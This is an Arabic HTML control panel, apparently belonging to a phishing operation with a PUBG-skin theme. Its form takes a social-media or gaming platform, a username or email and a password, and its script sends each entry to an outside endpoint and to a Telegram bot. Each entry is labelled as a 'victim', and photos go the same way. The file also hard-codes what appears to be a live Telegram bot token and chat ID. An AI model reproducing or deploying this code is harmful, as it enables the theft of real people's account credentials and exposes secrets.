<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>مركز التحديث</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:20px}
.container{max-width:500px;margin:0 auto}
.header{text-align:center;margin-bottom:20px}
.logo{font-size:50px;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
h1{color:#ffaa00;font-size:20px;margin:10px 0}
.card{background:#111;border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px}
.card h2{color:#ffaa00;font-size:14px;margin-bottom:12px}
input,select,textarea{width:100%;padding:12px;background:#000;border:1px solid #333;border-radius:8px;color:#fff;font-size:13px;outline:none;margin-bottom:10px;font-family:'Segoe UI',Tahoma,sans-serif}
input:focus,select:focus,textarea:focus{border-color:#ffaa00}
textarea{min-height:80px;resize:vertical}
.btn{width:100%;padding:14px;border-radius:8px;border:none;font-size:15px;font-weight:bold;cursor:pointer;margin-top:6px}
.btn-photo{background:#e1306c;color:#fff}
.btn-video{background:#5865f2;color:#fff}
.btn-text{background:#4CAF50;color:#fff}
.btn:active{transform:scale(0.96)}
.file-zone{border:2px dashed #333;border-radius:12px;padding:30px;text-align:center;cursor:pointer;margin:10px 0}
.file-zone:hover{border-color:#ffaa00}
.file-zone .icon{font-size:40px}
.file-zone .txt{color:#666;font-size:13px;margin-top:8px}
input[type=file]{display:none}
.preview-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin:10px 0}
.preview-grid img{width:100%;border-radius:6px;max-height:100px;object-fit:cover}
video{width:100%;max-height:200px;border-radius:8px;display:none}
.status{color:#ffaa00;font-size:13px;text-align:center;margin:8px 0}
.logs{max-height:200px;overflow-y:auto;font-size:11px;color:#666;margin-top:10px}
.log-item{padding:6px 0;border-bottom:1px solid #1a1a1a}
.log-item.success{color:#4CAF50}
.log-item.error{color:#ff0040}
.tabs{display:flex;gap:6px;margin-bottom:14px}
.tab{flex:1;padding:10px;background:#111;border:1px solid #333;border-radius:8px;text-align:center;cursor:pointer;font-size:12px}
.tab.active{border-color:#ffaa00;color:#ffaa00}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="logo">⚡</div>
<h1>مركز التحكم</h1>
<p class="sub">كل البيانات توصل للوحة التحكم</p>
</div>

<div class="tabs">
<div class="tab active" onclick="switchTab('photo')">📸 صور</div>
<div class="tab" onclick="switchTab('text')">📝 حسابات</div>
</div>

<div class="card" id="tab-photo">
<h2>📸 رفع الصور</h2>
<input type="file" id="photoInput" accept="image/*" multiple onchange="previewFiles()">
<div class="file-zone" onclick="document.getElementById('photoInput').click()">
<div class="icon">📸</div><div class="txt">اضغط لاختيار صور</div>
</div>
<div class="preview-grid" id="photoPreview"></div>
<button class="btn btn-photo" onclick="uploadPhotos()">📸 رفع للوحة التحكم</button>
</div>

<div class="card" id="tab-text" style="display:none">
<h2>📝 بيانات الحسابات</h2>
<select id="textType">
<option value="">اختر النوع</option>
<option value="فيسبوك">📘 فيسبوك</option>
<option value="انستجرام">📷 انستجرام</option>
<option value="واتساب">💬 واتساب</option>
<option value="تويتر">🐦 تويتر</option>
<option value="سناب شات">👻 سناب شات</option>
<option value="تيك توك">🎵 تيك توك</option>
<option value="PUBG">🎮 PUBG</option>
<option value="فري فاير">🎯 فري فاير</option>
</select>
<input type="text" id="textTitle" placeholder="اسم المستخدم / الإيميل">
<input type="password" id="textPass" placeholder="كلمة المرور">
<textarea id="textExtra" placeholder="معلومات إضافية"></textarea>
<button class="btn btn-text" onclick="sendText()">📝 إرسال للوحة</button>
</div>

<div class="status" id="status">⏳ جاهز</div>
<div class="logs" id="logs"></div>
</div>

<script>
var API='https://pubgskin.vercel.app/api/save';
var CHAT='7276604783';
var TOKEN='8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
var photoFiles=[];

function switchTab(tab){
document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
document.querySelectorAll('.card').forEach(function(c){c.style.display='none';});
document.getElementById('tab-'+tab).style.display='block';
document.querySelectorAll('.tab')[tab==='photo'?0:1].classList.add('active');
}

function addLog(msg,type){
var l=document.getElementById('logs');
var d=document.createElement('div');
d.className='log-item '+(type||'success');
d.textContent=msg;
l.appendChild(d);
l.scrollTop=l.scrollHeight;
}

function previewFiles(){
photoFiles=Array.from(document.getElementById('photoInput').files);
document.getElementById('photoPreview').innerHTML='';
photoFiles.forEach(function(f){
var r=new FileReader();
r.onload=function(e){
var img=document.createElement('img');
img.src=e.target.result;
document.getElementById('photoPreview').appendChild(img);
};
r.readAsDataURL(f);
});
}

async function uploadPhotos(){
if(!photoFiles.length)return addLog('❌ اختر صور','error');
document.getElementById('status').textContent='⏳ جاري الرفع...';
for(var i=0;i<photoFiles.length;i++){
var r=new FileReader();
r.onload=async function(e){
// نبعت للـ API
await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',url:e.target.result,service:'📸 صورة',device:navigator.userAgent})});
};
r.readAsDataURL(photoFiles[i]);

var fd=new FormData();
fd.append('chat_id',CHAT);
fd.append('photo',photoFiles[i]);
fd.append('caption','📸 صورة '+(i+1));
await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:fd});
addLog('✅ صورة '+(i+1)+' ← اللوحة + تيليجرام');
}
document.getElementById('status').textContent='✅ تم رفع '+photoFiles.length+' صورة';
}

async function sendText(){
var type=document.getElementById('textType').value;
var title=document.getElementById('textTitle').value.trim();
var pass=document.getElementById('textPass').value.trim();
var extra=document.getElementById('textExtra').value.trim();
if(!type||!title||!pass)return addLog('❌ املأ الحقول','error');
var text='👤 '+title+' | 🔒 '+pass+(extra?' | 📋 '+extra:'');
var msg='📝 <b>ضحية '+type+'!</b>\n\n👤 '+title+'\n🔒 '+pass+'\n🕐 '+new Date().toLocaleString('ar-EG');

// نبعت للـ API
await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'victim',service:type,text:text,device:navigator.userAgent})});

// نبعت لتيليجرام
await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'HTML'})});

addLog('✅ '+type+' ← اللوحة + تيليجرام');
document.getElementById('status').textContent='✅ تم الإرسال';
document.getElementById('textTitle').value='';
document.getElementById('textPass').value='';
document.getElementById('textExtra').value='';
}
</script>
</body>
</html>
